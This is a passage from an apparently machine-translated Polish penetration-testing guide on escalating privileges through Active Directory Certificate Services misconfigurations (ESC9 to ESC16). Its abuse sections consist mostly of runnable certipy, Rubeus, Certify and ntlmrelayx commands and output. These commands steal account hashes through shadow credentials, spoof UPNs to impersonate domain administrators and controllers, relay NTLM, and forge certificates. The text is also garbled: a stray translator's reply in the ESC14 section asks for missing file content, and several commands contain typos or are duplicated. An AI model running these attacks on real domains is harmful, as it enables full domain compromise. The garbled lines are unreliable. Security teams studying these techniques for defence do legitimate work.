[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia zabezpieczeń - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, nazywana ESC9, uniemożliwia osadzenie **nowego rozszerzenia bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Ta flaga staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (ustawienie domyślne), w przeciwieństwie do ustawienia `2`. Jej znaczenie wzrasta w scenariuszach, w których można wykorzystać słabsze mapowanie certyfikatu dla Kerberos lub Schannel (jak w ESC10), ponieważ brak ESC9 nie zmieniałby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

- `StrongCertificateBindingEnforcement` nie jest ustawione na `2` (domyślnie `1`), lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat jest oznaczony flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- W certyfikacie określono dowolne EKU do uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` nad dowolnym kontem pozwalające na skompromitowanie innego.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, a celem jest skompromitowanie `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma prawo się zapisać, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo hash `Jane` zostaje pozyskany przy użyciu Shadow Credentials, dzięki uprawnieniom `GenericWrite` `John@corp.local`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje zmodyfikowana na `Administrator`, celowo pomijając część domenową `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` konta `Administrator`.

Następnie żądany jest szablon certyfikatu `ESC9`, oznaczony jako podatny, jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, pozbawiony jakiegokolwiek “object SID”.

`userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócone do jej oryginalnego `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia przy użyciu wystawionego certyfikatu teraz zwraca hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku specyfikacji domeny w certyfikacie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Wyjaśnienie

Do ESC10 odnoszą się dwie wartości kluczy rejestru na kontrolerze domeny:

- Domyślna wartość dla `CertificateMappingMethods` w kluczu `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie dla `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest ustawione na `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do przejęcia dowolnego konta B.

Na przykład mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący chce przejąć `Administrator@corp.local`. Procedura jest analogiczna do ESC9 i pozwala wykorzystać dowolny szablon certyfikatu.

Na początku hash `Jane` jest pozyskiwany przy użyciu Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie wartość `userPrincipalName` użytkownika `Jane` została zmieniona na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczeń.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie żądany jest certyfikat umożliwiający uwierzytelnianie klienta w imieniu `Jane`, używając domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie za pomocą uzyskanego certyfikatu spowoduje uzyskanie NT hasha konta `Administrator@corp.local`, dlatego w poleceniu trzeba określić domenę, ponieważ certyfikat nie zawiera informacji o domenie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A posiadające uprawnienia `GenericWrite` może przejąć dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszynowe oraz wbudowane konto administratora domeny `Administrator`.

Tutaj celem jest przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` przez Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` użytkownika `Jane` jest następnie ustawiony na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Zażądano certyfikatu do uwierzytelniania klienta jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Wartość `userPrincipalName` użytkownika `Jane` zostaje przywrócona do pierwotnej po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Aby uwierzytelnić się przez Schannel, użyto opcji `-ldap-shell` Certipy, co wskazuje pomyślne uwierzytelnienie jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pomocą LDAP shell polecenia takie jak `set_rbcd` umożliwiają ataki Resource-Based Constrained Delegation (RBCD), potencjalnie kompromitując domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta podatność dotyczy także każdego konta użytkownika, które nie ma ustawionego `userPrincipalName` lub gdzie wartość ta nie odpowiada `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest szczególnie atrakcyjnym celem ze względu na swoje podwyższone uprawnienia LDAP oraz fakt, że domyślnie nie ma ustawionego `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli CA Server nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, umożliwia to przeprowadzenie NTLM relay attacks bez podpisywania za pośrednictwem usługi RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Możesz użyć `certipy`, aby sprawdzić, czy `Enforce Encryption for Requests` jest Disabled; certipy pokaże wtedy `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Należy skonfigurować relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Uwaga: dla kontrolerów domeny należy określić `-template` w DomainController.

Lub używając [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certificate Authority tak, aby przechowywał go na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB, lub przez USB device server w przypadku, gdy serwer CA jest maszyną wirtualną, Key Storage Provider potrzebuje klucza uwierzytelniającego (czasami określanego jako "password"), aby generować i używać kluczy na YubiHSM.

Ten klucz/password jest przechowywany w rejestrze pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci jawnej.

Odniesienie: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenariusz nadużycia

Jeśli prywatny klucz CA jest przechowywany na fizycznym urządzeniu USB, a uzyskasz dostęp shell, możliwe jest odzyskanie tego klucza.

Najpierw musisz uzyskać certyfikat CA (jest publiczny), a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na koniec użyj polecenia certutil `-sign`, aby sfałszować nowy dowolny certyfikat używając certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` pozwala dodać politykę wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, odpowiedzialne za wydawanie polityk, można odnaleźć w Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Polityka może być powiązana z grupą AD przy użyciu atrybutu tego obiektu `msDS-OIDToGroupLink`, co pozwala systemowi autoryzować użytkownika, który przedstawi certyfikat, tak jakby był członkiem tej grupy. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Innymi słowy, jeśli użytkownik ma uprawnienie do enrollowania certyfikatu, a certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) aby znaleźć OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź uprawnienie użytkownika, którego można użyć za pomocą `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienie do enrollowania szablonu `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy, że wskaże szablon — otrzyma certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Podatna konfiguracja odnowienia certyfikatu - ESC14

### Wyjaśnienie

Opis pod adresem https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest wyjątkowo szczegółowy. Poniżej cytat oryginalnego tekstu.

ESC14 dotyczy podatności wynikających ze "słabego explicit certificate mapping", przede wszystkim przez niewłaściwe użycie lub niebezpieczną konfigurację atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów Active Directory. Ten wielowartościowy atrybut pozwala administratorom ręcznie powiązać certyfikaty X.509 z kontem AD w celu uwierzytelniania. Gdy jest wypełniony, te explicit mappings mogą nadpisać domyślną logikę mapowania certyfikatów, która zwykle opiera się na UPNach lub nazwach DNS w SAN certyfikatu, albo na SID osadzonym w rozszerzeniu bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`.

"Słabe" mapowanie występuje, gdy string używany w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt szeroki, łatwy do odgadnięcia, opiera się na nieunikalnych polach certyfikatu lub wykorzystuje łatwo podszywalne komponenty certyfikatu. Jeśli atakujący może uzyskać lub stworzyć certyfikat, którego atrybuty pasują do tak słabo zdefiniowanego explicit mapping dla uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako oraz podszywania się pod to konto.

Przykłady potencjalnie słabych stringów mapujących w `altSecurityIdentities` obejmują:

- Mapowanie wyłącznie po powszechnym polu Subject Common Name (CN): np. `X509:<S>CN=SomeUser`. Atakujący może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Używanie nadmiernie ogólnych Issuer Distinguished Names (DNs) lub Subject DNs bez dalszej kwalifikacji, takiej jak konkretny numer seryjny lub subject key identifier: np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Stosowanie innych przewidywalnych wzorców lub niekryptograficznych identyfikatorów, które atakujący mógłby spełnić w certyfikacie, który może legalnie uzyskać lub sfałszować (jeśli przejął CA lub znalazł podatny szablon jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie po pełnym Issuer i Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie po wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie po numerze seryjnym, implicite kwalifikowanym przez Issuer DN) - to nie jest standardowy format, zwykle jest to `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie po nazwie RFC822, typowo adresie e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie po hashu SHA1 surowego klucza publicznego certyfikatu - generalnie mocne)

Bezpieczeństwo tych mapowań w dużej mierze zależy od szczegółowości, unikalności i kryptograficznej siły wybranych identyfikatorów certyfikatu użytych w stringu mapującym. Nawet przy włączonych trybach silnego wiązania certyfikatów na Domain Controllers (które głównie wpływają na implicit mappings oparte na SAN UPNs/DNS i rozszerzeniu SID), źle skonfigurowany wpis `altSecurityIdentities` może nadal stanowić bezpośrednią drogę do podszywania się, jeśli sama logika mapowania jest wadliwa lub zbyt permissive.

### Scenariusz nadużycia

ESC14 celuje w explicit certificate mappings w Active Directory (AD), konkretnie w atrybut `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (z założenia lub przez błędną konfigurację), atakujący mogą podszywać się pod konta, prezentując certyfikaty, które pasują do mapowania.

#### Scenariusz A: Atakujący może zapisać do `altSecurityIdentities`

**Precondycja**: Atakujący ma uprawnienia zapisu do atrybutu `altSecurityIdentities` docelowego konta lub ma uprawnienie do jego nadania w postaci jednego z następujących uprawnień na docelowym obiekcie AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenariusz B: Cel ma słabe mapowanie przez X509RFC822 (Email)

- **Precondycja**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`. Atakujący może ustawić atrybut mail konta ofiary tak, aby odpowiadał X509RFC822 nazwy celu, zarejestrować certyfikat jako ofiara i użyć go, aby uwierzytelnić się jako cel.

#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Precondycja**: Cel ma słabe explicit mapping X509IssuerSubject w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na koncie ofiary, aby pasował do subject mapowania X509IssuerSubject celu. Następnie atakujący może zarejestrować certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.

#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Precondycja**: Cel ma słabe explicit mapping X509SubjectOnly w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na koncie ofiary, aby pasował do subject mapowania X509SubjectOnly celu. Następnie atakujący może zarejestrować certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.

### concrete operations
#### Scenario A

Zażądaj certyfikatu z szablonu `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zapisz i skonwertuj certyfikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Uwierzytelnij się (przy użyciu certyfikatu)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Nie otrzymałem treści pliku domain-escalation.md. Proszę wklej zawartość, którą mam przetłumaczyć na polski.
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

Opis na https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc jest wyjątkowo wyczerpujący. Poniżej cytat oryginalnego tekstu.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Wykorzystanie

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Polecenie `find` z Certipy może pomóc zidentyfikować szablony V1 potencjalnie podatne na ESC15, jeśli CA nie jest załatana.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenariusz A: Direct Impersonation via Schannel

**Krok 1: Request a certificate, injecting "Client Authentication" Application Policy and target UPN.** Atakujący `attacker@corp.local` celuje w `administrator@corp.local` używając szablonu "WebServer" V1 (który pozwala na enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Wrażliwy szablon V1 z "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies w CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu podszywania się.

**Krok 2: Uwierzytelnij się przez Schannel (LDAPS) używając uzyskanego certyfikatu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenariusz B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Krok 1: Zażądaj certyfikatu z V1 template (with "Enrollee supplies subject"), wstrzykując Application Policy "Certificate Request Agent".** Ten certyfikat ma pozwolić atakującemu (`attacker@corp.local`) zostać enrollment agentem. Nie podano tutaj żadnego UPN dla tożsamości atakującego, ponieważ celem jest uzyskanie możliwości działania jako enrollment agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Krok 2: Użyj certyfikatu "agent" do zażądania certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Krok 3: Uwierzytelnij się jako uprzywilejowany użytkownik, używając certyfikatu "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Wyjaśnienie

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi się do scenariusza, w którym, jeśli konfiguracja AD CS nie wymusza dołączenia rozszerzenia **szOID_NTDS_CA_SECURITY_EXT** do wszystkich certyfikatów, atakujący może to wykorzystać poprzez:

1. Zażądanie certyfikatu **without SID binding**.

2. Użycie tego certyfikatu **do uwierzytelniania jako dowolne konto**, np. podszywanie się pod konto o wysokich uprawnieniach (np. Administrator domeny).

Możesz również odnieść się do tego artykułu, aby dowiedzieć się więcej o szczegółowej zasadzie: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Wykorzystanie

The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.

Aby zidentyfikować, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Krok 1: Odczytaj początkowy UPN konta ofiary (Opcjonalnie - do przywrócenia).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Krok 2: Zaktualizuj UPN konta ofiary na `sAMAccountName` docelowego administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Krok 3: (Jeśli to potrzebne) Uzyskaj poświadczenia konta "ofiary" (np. Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Krok 4: Zażądaj certyfikatu jako użytkownik "victim" z _dowolnego odpowiedniego szablonu uwierzytelniania klienta_ (np. "User") na CA podatnym na ESC16.** Ponieważ CA jest podatne na ESC16, automatycznie pominie rozszerzenie bezpieczeństwa SID w wydanym certyfikacie, niezależnie od ustawień tego rozszerzenia w szablonie. Ustaw zmienną środowiskową Kerberos credential cache (polecenie shell):
```bash
export KRB5CCNAME=victim.ccache
```
Następnie zażądaj certyfikatu:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Krok 5: Przywróć UPN konta "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Krok 6: Uwierzytelnij się jako docelowy administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromitowanie lasów za pomocą certyfikatów — wyjaśnione w stronie biernej

### Łamanie zaufania między lasami przez skompromitowane CA

Konfiguracja dla **cross-forest enrollment** jest stosunkowo prosta. Certyfikat **root CA** z lasu zasobów jest przez administratorów **publikowany do account forests**, a certyfikaty **Enterprise CA** z lasu zasobów są **dodawane do `NTAuthCertificates` i kontenerów AIA w każdym account forest**. Dla jasności, takie ustawienie daje **CA w lesie zasobów pełną kontrolę** nad wszystkimi pozostałymi lasami, dla których zarządza PKI. Jeśli ta CA zostanie **skomromitowana przez atakujących**, certyfikaty dla wszystkich użytkowników zarówno w lesie zasobów, jak i w account forests mogłyby zostać przez nich **podrobione**, łamiąc tym samym granicę bezpieczeństwa lasu.

### Uprawnienia do rejestracji przyznane podmiotom zewnętrznym

W środowiskach wielo-lasowych należy zachować ostrożność względem Enterprise CA, które publikują szablony certyfikatów pozwalające na przyznanie praw do rejestracji i edycji grupie **Authenticated Users** lub **foreign principals** (użytkownicy/grupy spoza lasu, do którego należy Enterprise CA).  
Po uwierzytelnieniu poprzez trust AD dodaje do tokenu użytkownika **Authenticated Users SID**. W związku z tym, jeśli domena posiada Enterprise CA ze szablonem, który **pozwala grupie Authenticated Users na prawa rejestracji**, szablon taki mógłby zostać zarejestrowany przez użytkownika z innego lasu. Podobnie, jeśli szablon jawnie przyznaje prawa rejestracji zagranicznemu podmiotowi, tworzy to relację kontroli dostępu między lasami, umożliwiając podmiotowi z jednego lasu rejestrację w szablonie z innego lasu.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu na inny. Ustawienia szablonu certyfikatu mogą zostać wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcej domenie.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
